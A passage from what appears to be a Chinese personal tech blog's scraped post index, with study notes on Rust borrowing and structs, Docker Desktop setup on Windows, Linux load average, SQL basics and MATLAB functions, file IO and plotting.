123456fn main() { let s1 = String::from(&quot;hello&quot;); let s2 = &amp;s1; let s3 = s1; // 此时hello已经属于s3，不再属于s1，此时s2无法使用 println!(&quot;{}&quot;, s2);} 这段程序不正确：因为 s2 租借的 s1 已经将所有权移动到 s3，所以 s2 将无法继续租借使用 s1 的所有权。如果需要使用 s2 使用该值，必须重新租借： 1234567fn main() { let s1 = String::from(&quot;hello&quot;); let mut s2 = &amp;s1; let s3 = s1; s2 = &amp;s3; // 重新从 s3 租借所有权 println!(&quot;{}&quot;, s2);} 这段程序是正确的。既然引用不具有所有权，即使它租借了所有权，它也只享有使用权（这跟租房子是一个道理）。如果尝试利用租借来的权利来修改数据会被阻止： 把引用作为参数的行为成为借用 无法修改借用的东西 123456789fn main() { let s1 = String::from(&quot;hello&quot;); let len = calculate_length(&amp;s1); println!(&quot;The length of '{}' is {}.&quot;, s1, len);}fn calculate_length(s: &amp;String) -&gt; usize { s.push_str(&quot;, world!&quot;); // 错误，禁止修改租借的值 s.len()} 和变量一样，引用默认也是不可变的 这段程序中 s2 尝试修改 s1 的值被阻止，租借的所有权不能修改所有者的值。 当然，也存在一种可变的租借方式，就像你租一个房子，如果物业规定房主可以修改房子结构，房主在租借时也在合同中声明赋予你这种权利，你是可以重新装修房子的： 可变引用示例 12345678910111213fn main() { let mut s1 = String::from(&quot;hello&quot;); // s1可变 let len = calculate_length(&amp;mut s1); // 传入函数的是可变的引用 println!(&quot;The length of '{}' is {}.&quot;, s1, len);}fn calculate_length(s: &amp;mut String) -&gt; usize { s.push_str(&quot;, world!&quot;); s.len()} OUTPUT --&gt; The length of 'hello, world!' is 13. 这段程序就没有问题了。我们用 &amp;mut 修饰可变的引用类型。 可变引用与不可变引用相比除了权限不同以外，可变引用不允许多重引用，但不可变引用可以： 123456let mut s = String::from(&quot;hello&quot;);let r1 = &amp;mut s;let r2 = &amp;mut s;println!(&quot;{}, {}&quot;, r1, r2); 这段程序不正确，因为多重可变引用了 s。 Rust 对可变引用的这种设计主要出于对并发状态下发生数据访问碰撞的考虑，在编译阶段就避免了这种事情的发生。 由于发生数据竞争的必要条件之一是数据被至少一个使用者写且同时被至少一个其他使用者读或写，所以在一个值被可变引用时不允许再次被任何引用。 以下三种行为会发生数据竞争： 两个或多个指针同时访问同一个数据 至少有一个指针用于写入数据 没有任何机制来同步数据的访问 所以可变引用有一个重要的限制：在特定作用域内，对某一块数据，只能有一个可变的引用； 可以在编译时防止数据竞争 可以通过创建新的作用域来创建多个可变引用 1234567fn main() { let mut s = String::from(&quot;hello&quot;); { let r1 = &amp;mut s; } // r1 goes out of scope here, so we can make a new reference with no problems let r2 = &amp;mut s;} 另一个限制 不可以同时拥有一个可变引用和一个不可变引用（因为有了一个不可变引用同时有一个可变说明不可变可变） 但是多个不可变引用是可以的 1234567fn main() { let mut s = String::from(&quot;hello&quot;); let r1 = &amp;s; // no problem let r2 = &amp;s; // no problem let r3 = &amp;mut s; // BIG PROBLEM println!(&quot;{}, {}, and {}&quot;, r1, r2, r3);} 悬空引用(Dangling Reference) 悬空指针(Dangling Pointer)：一个指针引用了内存中的某个地址，而这块地址可能已经被释放并分配给其他人使用 在 Rust 里，编译器会保证引用永远不会悬空： 如果引用了某些数据，编译器将保证在引用离开作用域前数据不会离开作用域 12345678fn main() { let r = dangle();}fn dangle() -&gt; &amp;String { // dangle returns a reference to a String let s = String::from(&quot;hello&quot;); // s is a new String &amp;s // we return a reference to the String, s} // Here, s goes out of scope, and is dropped. Its memory goes away. Danger! 引用的规则 在任何给定的时刻，只能满足下列条件之一：. - 一个可变的引用 任意数量不可变的引用 引用必须一直有效","link":"/2022/12/04/07-RUST/07-RUST04%E6%89%80%E6%9C%89%E6%9D%83/"},{"title":"Rust-note-06结构","text":"一.结构 定义 struct 使用 struct 关键字，并命名 在{…}内，为所有字段(Field)定义名称和类型 例如： 123456struct User{ username: String, email: String, sign_in_count: u64, active: bool,} 实例化 stuct 要创建实例 (废话但是废话好有道理啊) 为字段指定值(要全部指定) 无需按顺序 例子 123456let user1 = User { username: String::from(&quot;somename&quot;), email: String::from(&quot;someone@what.com&quot;), sign_in_count: 1, active: true,}; 取 struct 中的值 使用点运算符： 1234567let user1 = User { username: String::from(&quot;somename&quot;), email: String::from(&quot;someone@what.com&quot;), sign_in_count: 1, active: true,};user1.email = String::from(&quot;what?what?&quot;); 一旦 struct 的实例是可变的，那么实例中所有的字段都是可变的 struct 作为函数返回值 此时这个 user 作为此函数的返回值 12345678fn build_user(email: String, username: String) -&gt; User { User { username: username, email: email, sign_in_count: 1, active: true, }} 元组结构体有一种更简单的定义和使用结构体的方式：元组结构体。 元组结构体是一种形式是元组的结构体。 与元组的区别是它有名字和固定的类型格式。它存在的意义是为了处理那些需要定义类型（经常使用）又不想太复杂的简单数据： 12345struct Color(u8, u8, u8);struct Point(f64, f64);let black = Color(0, 0, 0);let origin = Point(0.0, 0.0); 使用方式和元组一样，可以使用下标来访问： 12345678910fn main() { struct Color(u8, u8, u8); struct Point(f64, f64); let black = Color(0, 0, 0); let origin = Point(0.0, 0.0); println!(&quot;black = ({}, {}, {})&quot;, black.0, black.1, black.2); println!(&quot;origin = ({}, {})&quot;, origin.0, origin.1);} 结构体所有权结构体必须掌握字段值所有权，因为在结构体失效时会释放所有字段。 输出结构体可以加入 #[derive(Debug)]来输出整个结构体 123456789101112#[derive(Debug)]struct Rectangle { width: u32, height: u32,}fn main() { let rect1 = Rectangle { width: 30, height: 50 }; println!(&quot;rect1 is {:?}&quot;, rect1); // 使用{:?}占位符来输出整个结构体} rect1 is Rectangle { width: 30, height: 50 } 使用{:?} rect1 is Rectangle { 使用{:#?} width: 30, height: 50} 结构体方法方法和函数是类似的，但是是通过结构体来实现。 Rust 语言不是面向对象的，从它所有权机制的创新可以看出这一点。但是面向对象可以在 Rust 实现。 结构体方法的第一个参数必须是 &amp;self，不需声明类型，因为 self 不是一种风格而是关键字。 123456789101112131415struct Rectangle { width: u32, height: u32,} impl Rectangle { fn area(&amp;self) -&gt; u32 { self.width * self.height }}fn main() { let rect1 = Rectangle { width: 30, height: 50 }; println!(&quot;rect1's area is {}&quot;, rect1.area());} rect1’s area is 1500 结构体关联函数有些函数不依靠实例，但是使用需要注明是来自哪个impl模块 12345678910111213141516#[derive(Debug)]struct Rectangle { width: u32, height: u32,}impl Rectangle { fn create(width: u32, height: u32) -&gt; Rectangle { Rectangle { width, height } }}fn main() { let rect = Rectangle::create(30, 50); println!(&quot;{:?}&quot;, rect);}","link":"/2022/12/05/07-RUST/07-RUST06%E7%BB%93%E6%9E%84/"},{"title":"Docker Desktop","text":"Docker Desktop使用记录安装(Win)我用的是Windows下的Docker Desktop，众所周知，docker 只有 linux 的发行版本，作为 windows 用户想要使用 docker 的功能自然仅能通过加装虚拟机这一条途径。同样，号称支持 windows 系统的 docker desktop 也是基于同样原理 —— 默认使用 windows 自带的 Hyper-V 服务允许 docker。 所以想安装 docker desktop 就要确保您的 windows 系统支持 wsl(适用于 Linux 的 Windows 子系统) 功能。我们可以直接在 cmd 或 powershell 中输入wsl 来检查是否开启了wsl服务。 打开 控制面板-&gt;程序-&gt;启用或关闭Windows功能，假如有 Hyper-V 和 适用于 Linux 的 Windows 子系统这两个选项，那就愉快得开启，假如没有那你就得去安装一下了 Hyper-V 123456789pushd &quot;%~dp0&quot;dir /b %SystemRoot%\\servicing\\Packages\\*Hyper-V*.mum &gt;hyper-v.txtfor /f %%i in ('findstr /i . hyper-v.txt 2^&gt;nul') do dism /online /norestart /add-package:&quot;%SystemRoot%\\servicing\\Packages\\%%i&quot;del hyper-v.txtDism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL wsl 在管理员模式下打开 PowerShell 或 Windows 命令提示符，输入 wsl --install 命令，然后重启电脑。 安装 Docker Desktop 如果每次启动都闪退，可能是你开启了SMB 1.0/CIFS 文件共享支持,去windows功能里给它关了就行了 一些设置镜像站设置众所周知在天朝有些地方没法正常访问，所以为了加快拉取镜像的速度，需要设置一些镜像站。 来到这个页面更改里面的配置 以下是我的设置，当然你可以自己去找选择自己喜欢的。 12345678{ &quot;registry-mirrors&quot;: [ &quot;https://dockerproxy.com&quot;, &quot;https://hub-mirror.c.163.com&quot;, &quot;https://mirror.baidubce.com&quot;, &quot;https://ccr.ccs.tencentyun.com&quot; ]} 使用获取镜像 在docker hub寻找需要下载的镜像（在cmd中执行docker search [镜像名]命令也可） 现在也可以直接在上面搜出来","link":"/2023/04/08/10-docker%20desktop%E8%AE%B0%E5%BD%95/"},{"title":"Linux 性能-00","text":"何为性能指标？性能是什么？大多数人的第一反应大多是速度快，而这正对应着两个指标吞吐和延时。然而这两个指标是从用户体验来看的，这两个指标可以从应用负载的角度来考察。与之相反的就是从系统资源的角度来看，比如资源使用率等。 众所周知，随着负载的增加，消耗的系统资源也会随之上升，而性能问题的本质是系统资源耗尽，无法处理足够的请求。 性能分析，其实就是找出应用或者系统的瓶颈，并设法去避免或者缓解，从而处理更多的请求，一般保研以下步骤： 选择指标评估应用程序和系统的性能； 为应用程序和系统设置性能目标； 进行性能基准测试； 性能分析定位瓶颈； 优化系统和应用程序； 性能监控和告警。 一些性能工具 你可以在这里找到它们","link":"/2023/04/11/11-Linux%E6%80%A7%E8%83%BD/11Linux%E6%80%A7%E8%83%BD-00/"},{"title":"Linux 性能-01","text":"平均负载（Load Average）是什么意思每次发现系统变慢时，我们通常做的第一件事，就是执行 top 或者 uptime 命令，来了解系统的负载情况。比如像下面这样，我在命令行里输入了 uptime 命令，系统也随即给出了结果。 12$ uptime02:34:03 up 2 days, 20:14, 1 user, load average: 0.63, 0.83, 0.88 在load average中分别是过去 1 分钟、5 分钟、15 分钟的平均负载。 平均负载是指单位时间内，系统处于可运行状态和不可中断状态的平均进程数，也就是平均活跃进程数 所谓可运行的进程，指的是正在使用或者正在等待CPU的进程。而平均负载可以理解为单位时间内有几个活跃的进程(事实上要复杂得多,实际上是活跃进程数的指数衰减平均值数学差的我根本不想去理解)。 那么对一个系统而言，负载高了显然是一件糟糕的事情，假如负载小于CPU的核心个数那意味着还有一些空闲，假如负载高于CPU的核心数目那意味着有些进程没法得到处理that’s bad。 平均负载为多少时合理可以想到，假如负载刚好等于CPU个数既不会有资源的浪费也没有进程无法得到处理。 为了知道CPU的个数可以使用以下命令： 12$ grep 'model name' /proc/cpuinfo | wc -l4 打个比方，平均负载的值越高，表示系统中需要运行的进程越多，系统越繁忙。反之，如果平均负载较低，表示系统相对空闲。为了更好地理解这个概念，我们可以将平均负载与现实生活中的一个例子相类比：超市的排队人数。假设超市有 4 个收银台，如果排队的人数为 4，那么每个收银台都有一个顾客在结账，系统运行得比较顺畅。如果排队的人数超过 4，那么一些顾客需要等待，系统开始变得繁忙。如果排队的人数远远超过 4，那么等待时间会变得很长，系统会变得非常繁忙。 其实在先前的 uptime命令获取到的3个时间段的负载中可以分析出不少信息： 首先，假如三个时间段的数值差距不大，这说明系统负载平稳，没有什么突发的进程。 假如1分钟的数值远小于15分钟的值，这说明在15分钟内有很高的负载，但在最近一分钟开始降低负载。 相反，假如1分钟的数值远大于15分钟的值，那说明最近系统负载正在上升。 这时候我们也会疑惑，当平均负载高于多少时应该做出行动，网上的建议是平均负载超出CPU最大负载的70%的时候应该排查一下问题，因为此时就可能影响服务的正常运行。但更合适的做法是联系起系统的长期负载，进行更深层次的分析后再做出处理。 相关命令1234567891011cpu核数: lscpu、 grep 'model name' /proc/cpuinfo | wc -l显示平均负载：uptime、top，显示的顺序是最近1分钟、5分钟、15分钟，从此可以看出平均负载的趋势watch -d uptime: -d会高亮显示变化的区域strees: 压测命令，--cpu cpu压测选项，-i io压测选项，-c 进程数压测选项，--timeout 执行时间mpstat: 多核cpu性能分析工具，-P ALL监视所有cpupidstat: 进程性能分析工具，-u 显示cpu利用率 总结平均负载指的是：单位时间内，系统中处于可运行状态和不可中断状态的平均进程数。","link":"/2023/04/12/11-Linux%E6%80%A7%E8%83%BD/11Linux%E6%80%A7%E8%83%BD-01/"},{"title":"SQL概述","text":"1.SQL概述1.1 SQL背景知识 在1974年，IBM 研究员发布了一篇揭开数据库技术的论文《SEQUEL：一门结构 化的英语查询语言》，直到今天这门结构化的查询语言并没有太大的变化，相比于其他语言，SQL 的半衰期可以说是非常长了。 SQL（Structured Query Language，结构化查询语言）是使用关系模型的数据库应用语言，与数据直接打交道 ，由IBM 上世纪70年代开发出来。后由美国国家标准局（ANSI）开始着手制定SQL标准，先后有 SQL-86 ，SQL-89 ，SQL-92 ，SQL-99 等标准。 不同的数据库生产厂商都支持SQL语句，但都有特有内容。 1.2 SQL分类 DDL（Data Definition Languages 数据定义语言），这些语句定义了不同的数据库、表、视图、索引等数据库对象，还可以用来创建、删除、修改数据库和数据表的结构。 DML（Data Manipulation Language、数据操作语言），用于添加、删除、更新和查询数据库记录，并检查数据完整性。 DCL（Data Control Language、数据控制语言），用于定义数据库、表、字段、用户的访问权限和安全级别。 2.1 SQL语法的规则与规范 SQL 可以写为一行或者是多行。为了提高可读性，可将字句分行。 每条命令以；or \\g or \\G 结束。(部分数据库要求) 2.2 SQL大小写规范 MySQL 在 Windows下对大写不敏感。 MySQL 在Linux下对大小写敏感。 数据库名、表名、表的别名、变量名严格区分大小写。 关键字、函数名、字段名、字段别名是忽略大小写的。 推荐的书写规范： 数据库名、表名、表别名、字段名、字段别名使用小写。 SQL关键字、函数名、绑定变量使用大写。 2.3 命名规则 数据库、表名不得超过30个字符，变量名限制为29个。 只能包含 A–Z, a–z, 0–9, _共63个字符。 数据库名、表名、字段名等对象名中间不要包含空格。 同一个MySQL软件中，数据库不能同名；同一个库中，表不能重名；同一个表中，字段不能重名。 必须保证你的字段没有和保留字、数据库系统或常用方法冲突。如果坚持使用，请在SQL语句中使 用`（着重号）引起来。 保持字段名和类型的一致性，在命名字段并为其指定数据类型的时候一定要保证一致性。假如数据 类型在一个表里是整数，那在另一个表里可就别变成字符型了。 例： 1234567#以下两句是一样的，不区分大小写show databases;SHOW DATABASES;#创建表格#create table student info(...); #表名错误，因为表名有空格create table student_info(...);","link":"/2022/11/26/02-SQL/02SQL%E6%A6%82%E8%BF%B0/"},{"title":"SQL常用命令","text":"1. SQL常用命令SQL 不区分大小写，SELECT与select是相同的。 某些数据库系统要求在每条 SQL 语句的末端使用分号。使用分号作为结束可以在一个请求中对服务器进行一条以上的语句。 比较重要的命令 SELECT - 从数据库中提取数据 UPDATE - 更新数据库中的数据 DELETE - 从数据库中删除数据 INSERT INTO - 向数据库中插入新数据 CREATE DATABASE - 创建新数据库 ALTER DATABASE - 修改数据库 CREATE TABLE - 创建新表 ALTER TABLE - 变更（改变）数据库表 DROP TABLE - 删除表 CREATE INDEX - 创建索引（搜索键） DROP INDEX - 删除索引 SELECT 语句 SELECT 语句用于从数据库中选取数据。 12SELECT column_name,column_nameFROM table_name; 或者 1SELECT * FROM table_name; 演示 1SELECT * FORM users; 此语句从 users 表中选取所有列 1SELECT name,age FROM users; 此语句从 users 表中选取age和name两列 WHERE 语句 WHERE 子句用于提取那些满足指定条件的记录。 123SELECT column_name,column_nameFROM table_nameWHERE column_name operator value; 演示 1SELECT * FROM users WHERE name='u1'; 此语句从 user表中选取name列都是”u1”的记录 WHERE 字句中的运算符 运算符 描述 = 等于 &lt;&gt; 不等于。注释：在 SQL 的一些版本中，该操作符可被写成 != &gt; 大于 &lt; 小于 &gt;= 大于等于 &lt;= 小于等于 BETWEEN 在某个范围内 LIKE 搜索某种模式 IN 指定针对某个列的多个可能值 AND &amp; OR 运算符 AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤。 演示 1234567891011SELECT * FROM WebsitesWHERE country='CN'AND alexa &gt; 50;SELECT * FROM WebsitesWHERE country='USA'OR country='CN';SELECT * FROM WebsitesWHERE alexa &gt; 15AND (country='CN' OR country='USA'); INSERT INTO 语句 INSERT INTO 语句可以有两种编写形式。 第一种形式无需指定要插入数据的列名，只需提供被插入的值即可： 12INSERT INTO *table_name*VALUES (*value1*,*value2*,*value3*,...); 第二种形式需要指定列名及被插入的值： 12INSERT INTO *table_name* (*column1*,*column2*,*column3*,...)VALUES (*value1*,*value2*,*value3*,...); 演示 1INSERT INTO users (name,age) VALUES ('u3',10); UPDATE 语句 显而易见是用来更新表中已有的记录。 123UPDATE table_nameSET column1=value1,column2=value2,...WHERE some_column=some_value; 演示 1UPDATE users SET age=18 WHERE name='u3'; 警告 如果省略了 WHERE 字句 会将所有 age 改为18 1UPDATE users SET age=18; DELETE 语句 用于删除表中的一行记录。 12DELETE FROM table_nameWHERE some_column=some_value; 演示 1DELETE FROM users WHERE age = 18; 删除了 age = 18 的一条记录 警告 和 UPDATE 同理，漏掉 WHERE 会删除表中所有记录","link":"/2022/11/23/02-SQL/03SQL%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"title":"MATLAB function初步","text":"MATLAB 中的函数在MATLAB中也有函数的概念，（没有的话不就是个垃圾平台了X，对吧） 函数文件与函数调用 M文件根据调用方式的不同可以分为两类 Script：脚本/命令文件 可以直接输入文件名运行 Function： 函数文件，由function引导，通常带输入和输出参数 函数文件12345678function [paras...]=func_name() end% 第一行是引导行，说明这个文件是个函数文件。% 函数名必须以字母开头% 输出参数大于一个时，用[]包裹% 函数文件名必须与函数名一致！ 支持递归 Matlab会传递两个永久变量nargin(number of arguments in)和 nargout记录输入和输出实参个数。 这个还是相当有用的。 函数文件中的多个函数在名为 stat2.m 的文件中定义两个函数，其中第一个函数调用第二个函数。 123456789function [m,s] = stat2(x) n = length(x); m = avg(x,n); s = sqrt(sum((x-m).^2/n));end function m = avg(x,n) m = sum(x)/n;end 我的理解是，一个函数文件可以写多个函数，而与文件名相同的那个函数则是对外暴露的函数，这样对数据操作的安全性也有所保障。 全局与局部变量在MATLAB中，变量可以被定义为全局变量或局部变量，具体含义如下： 局部变量：局部变量指的是在函数内部定义的变量，只在函数内部可见。局部变量的作用域仅限于函数内部，函数外部无法访问这些变量。 全局变量：全局变量指的是在函数外部定义的变量，可以被整个MATLAB程序中的任何函数访问。全局变量的作用域超出了函数内部，因此需要谨慎使用全局变量。 在函数中，可以通过以下方式定义和使用局部变量： 123456function result = myFunction(input) % 定义局部变量 localVariable = 0; % 使用局部变量进行计算 result = input + localVariable;end 在这个示例函数中，变量localVariable是一个局部变量，仅在myFunction函数内部可见。变量input是函数的输入参数，也是一个局部变量。 如果需要在函数中使用全局变量，可以使用global关键字进行声明。例如： 123456function result = myFunction(input) % 声明全局变量 global globalVariable; % 使用全局变量进行计算 result = input + globalVariable;end 在这个示例函数中，变量globalVariable是一个全局变量，使用global关键字进行声明。在函数内部，可以像使用局部变量一样使用全局变量。 需要注意的是，全局变量的使用会增加程序的复杂度和可维护性，因此应该尽量避免滥用全局变量。 我的理解是将一些数据定义为全局变量可以方便用户计算时候更简单的使用一些常量，而不用在函数列表中传入过多无意义的参数。 个人更倾向于把全局变量作为常量，因为对其的修改可能会导致一些意外的影响。（如有错误请指正X） 应用示例12345678910111213141516171819global numCalls; % 声明全局变量% 初始化全局变量numCalls = 0;% 定义一个函数，用于计算两个数的和function result = addNumbers(a, b) global numCalls; % 声明全局变量 numCalls = numCalls + 1; result = a + b;end% 调用函数，并多次计算两个数的和addNumbers(1, 2);addNumbers(3, 4);addNumbers(5, 6);% 输出全局变量的值，即函数被调用的次数disp(numCalls); output: 3","link":"/2023/04/13/12-Matlab/function/"},{"title":"MATLAB Data&amp;IO初步","text":"MATLAB 中数据操作 数据IO 文件IO Excel IO 数据的IO键盘接受数据1234x = input('message for user');x1 = input('message for user','s'); % 第二个参数是说明强制将输入解释为字符串% 这个参数还能是以下值% double single int8 int16 int32 int64 数据的显示在MATLAB中，disp()函数是一种常用的输出函数，用于在命令窗口中显示一个或多个值、表达式或者字符串。它的语法如下： 1disp(expression); 其中，expression是一个MATLAB表达式，可以是一个数值、矩阵、字符向量、单元数组、结构体等。 示例： 1234567891011121314151617181920% 显示一个字符串disp('Hello, world!');% 显示一个数值x = 3.14;disp(x);% 显示一个矩阵A = [1 2 3; 4 5 6; 7 8 9];disp(A);% 显示一个单元数组str = {'apple', 'banana', 'cherry'};disp(str);% 显示一个结构体s.name = 'John';s.age = 25;s.gender = 'Male';disp(s); 输出如下： 1234567891011 Hello, world! 3.1400 1 2 3 4 5 6 7 8 9 'apple' 'banana' 'cherry'struct with fields: name: 'John' age: 25 gender: 'Male' 需要注意的是，disp()函数在输出一个值或者表达式时，会自动添加一些格式化和分隔符，如空格、制表符等。如果需要对输出的格式进行更精确的控制，可以使用其他的输出函数，如fprintf()、sprintf()等。 格式化IO在MATLAB中，sprintf()函数是一种常用的输出函数，用于将格式化的数据转换成字符串。它的语法如下： 1str = sprintf(format, arg1, arg2, ...) 和常见格式化输出没啥区别，毕竟语言是互通的 例子： 123x = 3.1415926;str = sprintf('pi = %.2f', x);disp(str); 在上述代码中，sprintf()函数将数值x转换成一个带有两位小数的字符串，并将其赋值给变量str。然后，disp()函数将输出这个字符串，结果为： 1pi = 3.14 需要注意的是，sprintf()函数中的格式化字符串可以包含占位符和修饰符，用于控制输出的格式。常用的占位符包括%d（整数）、%f（浮点数）、%s（字符串）等，常用的修饰符包括精度控制符、宽度控制符、对齐控制符等。例如： 1234567891011121314str = sprintf('The answer is %d.', 42);disp(str); % 输出 &quot;The answer is 42.&quot;str = sprintf('x = %f', 3.1415926);disp(str); % 输出 &quot;x = 3.141593&quot;str = sprintf('%.2f', 3.1415926);disp(str); % 输出 &quot;3.14&quot;str = sprintf('%10s', 'Hello');disp(str); % 输出 &quot; Hello&quot;str = sprintf('%-10s', 'Hello');disp(str); % 输出 &quot;Hello &quot; 具体还是得去看文档，文档才是最好的教程~~~ 文件操作save在 MATLAB 中，save() 函数用于将变量保存到文件中，以便在以后的 MATLAB 会话中使用。它的基本语法如下： 123save(filename)save(filename, variables)save(filename, variables, '-option') 其中，filename 是字符串类型的参数，指定要保存的文件名及其路径；variables 是一个变量名列表，指定要保存的变量。第三个可选参数 -option 可以用来指定保存选项，如格式、版本等。 示例： 1234567891011% 保存单个变量到文件中x = rand(5);save('data.mat', 'x');% 保存多个变量到文件中y = 1:10;z = 'hello';save('data.mat', 'x', 'y', 'z');% 保存指定格式的文件save('data.txt', 'x', '-ascii'); open 函数 load在 MATLAB 中，load() 函数用于从文件中加载变量到 MATLAB 工作空间中。它的基本语法如下： 12load filenameload(filename, variables) 其中filename是文件的路径，variables是变量名列表，指定要从文件中加载的变量。 需要注意的是，使用 load() 函数加载 MAT 文件时，MATLAB 会将文件中的所有变量全部加载到内存中，这可能会导致内存溢出的问题。为了避免这种情况，可以使用 load() 函数的 -mat 选项，它只会加载指定的变量。此外，还可以使用其他选项，如 -ascii、-double、-float 等，用来加载文本文件或者二进制文件。看看文档喽 load 函数 fopen在 MATLAB 中，fopen() 函数用于打开文件，并返回一个文件标识符（file identifier），用于后续文件操作。它的基本语法如下： 1fid = fopen(filename, mode) 其中，filename 是要打开的文件名，可以包括文件路径；mode 是打开文件的模式，如读取模式 ‘r’、写入模式 ‘w’、追加模式 ‘a’ 等。打开文件后，fopen() 函数会返回一个文件标识符 fid，它可以用于后续文件操作。 下面是一些示例： 1234567891011% 打开文本文件以读取数据fid = fopen('data.txt', 'r');% 打开文本文件以写入数据fid = fopen('output.txt', 'w');% 打开二进制文件以读取数据fid = fopen('data.bin', 'rb');% 打开二进制文件以写入数据fid = fopen('output.bin', 'wb'); 在上述示例中，第一个示例中打开了一个文本文件 data.txt，并指定打开模式为 ‘r’，表示以只读模式打开文件。第二个示例中打开了一个文本文件 output.txt，并指定打开模式为 ‘w’，表示以写入模式打开文件。第三个示例中打开了一个二进制文件 data.bin，并指定打开模式为 ‘rb’，表示以二进制读取模式打开文件。第四个示例中打开了一个二进制文件 output.bin，并指定打开模式为 ‘wb’，表示以二进制写入模式打开文件。 需要注意的是，在打开文件时，需要指定正确的文件名和路径，并根据文件类型和需要的操作，选择合适的打开模式。如果打开文件失败，fopen() 函数会返回 -1，表示打开失败。 fopen 函数 fclose在 MATLAB 中，fclose() 函数用于关闭之前打开的文件，释放文件资源并关闭文件连接。它的基本语法如下： 1fclose(fid) 其中，fid 是之前打开文件所得到的文件标识符。关闭文件后，该文件标识符将不再可用。 下面是一个示例： 123456789% 打开文件fid = fopen('data.txt', 'r');% 读取数据data = fscanf(fid, '%f');% 关闭文件fclose(fid);% fclose 其实会返回一个状态，-1代表fall，0代表success 在上述示例中，fopen() 函数打开文件 data.txt，并指定打开模式为 'r'。接下来，使用 fscanf() 函数从文件中读取数据，并存储到变量 data 中。最后，使用 fclose() 函数关闭文件。 需要注意的是，在读取或写入文件完成后，必须使用 fclose() 函数关闭文件，否则会导致文件资源泄漏，影响系统性能。 fclose 函数 fread在 MATLAB 中，fread() 函数用于从打开的文件中读取二进制数据。它的基本语法如下： 12A = fread(fid, size, precision, skip, machinefmt)A = fread(fid, [M, N], precision, skip, machinefmt) 其中，各参数的含义如下： fid：文件标识符，之前使用 fopen() 函数打开文件时返回的值。 size：要读取的数据大小，可以是一个数字，表示读取 size 个字节的数据，也可以是一个向量，表示读取一个 size 元素的向量。在读取数据之前，必须知道数据大小。 precision：数据类型，即数据的编码格式。 skip：跳过的字节数，用于指定要从文件中跳过多少字节后开始读取数据。如果不指定，则默认从文件的开头读取数据。 machinefmt：机器格式，即字节顺序。可以是以下类型之一： ‘n’：本机格式（默认） ‘l’：小端格式 ‘b’：大端格式 [M, N]：矩阵的行数和列数，用于指定要读取的数据是一个 M 行 N 列的矩阵。 下面是一个示例： 12345678% 打开二进制文件fid = fopen('data.bin', 'rb');% 读取 5 个双精度浮点数A = fread(fid, 5, 'double');% 关闭文件fclose(fid); 在上述示例中，fopen() 函数打开了一个二进制文件 data.bin，并指定打开模式为 ‘rb’，表示以二进制读取模式打开文件。接下来，使用 fread() 函数从文件中读取 5 个双精度浮点数，并存储到变量 A 中。最后，使用 fclose() 函数关闭文件。 Excel文件IO读取在 MATLAB 中，可以使用 xlsread() 函数读取 Excel 文件中的数据。它的基本语法如下： 1[num, txt, raw] = xlsread(filename, sheet, range) 其中，filename 是 Excel 文件名，可以包括文件路径；sheet 是要读取的工作表名或索引；range是要读取的单元格范围。num 是一个数值矩阵，包含了读取的数值数据；txt 是一个文本矩阵，包含了读取的文本数据；raw 是一个单元格数组，包含了所有读取的数据，包括数值和文本。如果 Excel 文件中没有文本数据，则 txt 返回一个空矩阵。 下面是一个示例： 12% 读取 Excel 文件[num, txt, raw] = xlsread('data.xlsx', 'Sheet1', 'A1:C3'); 在上述示例中，xlsread() 函数读取了 Excel 文件 data.xlsx 中第一个工作表（’Sheet1’）中的单元格范围 ‘A1:C3’，并将数值、文本和原始数据分别存储到 num、txt 和 raw 中。 需要注意的是，xlsread() 函数只能读取 Excel 文件中的数值和文本数据，不能读取图表、公式等其他类型的数据。此外，如果要读取的 Excel 文件格式不是 .xls 或 .xlsx 格式，则可能需要使用其他的读取函数，如 csvread() 函数、textscan() 函数等。 写入在 MATLAB 中，可以使用 xlswrite() 函数将数据写入 Excel 文件。它的基本语法如下： 1xlswrite(filename, data, sheet, range) 其中，filename 是 Excel 文件名，可以包括文件路径；data 是要写入 Excel 文件的数据，可以是数值、文本或逻辑值；sheet 是要写入的工作表名或索引；range 是要写入的单元格范围。如果省略 sheet 参数，则默认写入第一个工作表；如果省略 range 参数，则默认写入整个工作表。 下面是一个示例： 123% 写入 Excel 文件data = [1 2 3; 4 5 6; 7 8 9];xlswrite('data.xlsx', data, 'Sheet1', 'A1:C3'); 在上述示例中，xlswrite() 函数将一个 3x3 的矩阵数据写入 Excel 文件 data.xlsx 的第一个工作表（’Sheet1’）中的单元格范围 ‘A1:C3’。 需要注意的是，xlswrite() 函数只能写入数值、文本和逻辑值数据，不能写入图表、公式等其他类型的数据。此外，如果要写入的 Excel 文件格式不是 .xls 或 .xlsx 格式，则可能需要使用其他的写入函数，如 csvwrite() 函数、fprintf() 函数等。","link":"/2023/04/13/12-Matlab/file/"},{"title":"MATLAB 绘图","text":"MATLAB 绘图这篇博文就来浅浅得说说MATLAB中的图像绘制，众所周知数据可视化是科学计算以及数据统计计算非常重要的部分，谁都不喜欢对着一大堆数字分析，看到一幅干干净净的图总能令人赏心悦目(但是作为使用者，真的不太喜欢，问就是懒) 这篇文章会提到以下内容： 图形窗口控制 二维图像绘制 三维图像绘制 三维曲线图(curve plot) 三维曲面/网格图( surface/grid plot) 图像窗口绘制创建图形窗口：figurefigure是MATLAB中中用来创建新的图形窗口的函数。每个图形窗口可以包含一个或多个图形对象（如曲线、散点图、直方图等）以及与其相关的文本、标签等。 语法如下： 123figurefigure(h) % h为窗口号figure('PropertyName', PropertyValue, ...) 清除图形界面：clfclf 是 “clear current figure” 的缩写，用于清除当前图形窗口中的内容，使得该窗口可以绘制新的图形。 关闭图形窗口： close在MATLAB中，close函数用于关闭一个图形窗口，释放与之相关联的内存和系统资源。 语法如下： 1234close allclose figure_handleclose('all')close('figure', figure_handle) close: 关闭当前活动的图形窗口。 close all: 关闭所有的图形窗口。 close figure_handle: 关闭指定图形句柄对应的图形窗口。 close('all'): 关闭所有的图形窗口。 close('figure', figure_handle): 关闭指定图形句柄对应的图形窗口。 其中，figure_handle 是一个整数或整数向量，表示图形句柄或多个图形句柄。如果要关闭多个图形窗口，可以使用整数向量指定多个图形句柄，例如 close([1, 2, 3])。 保持图形窗口：hold在 MATLAB 绘图中，hold 函数用于控制图形窗口是否保持当前绘图而不清空。当使用 hold on 后，新的绘图会添加到当前的图形中，而不会清空前面的绘图。当使用 hold off 后，新的绘图会覆盖之前的绘图。可以使用 hold 语句来打开或关闭保持模式。 语法如下： 1hold on/off 演示： 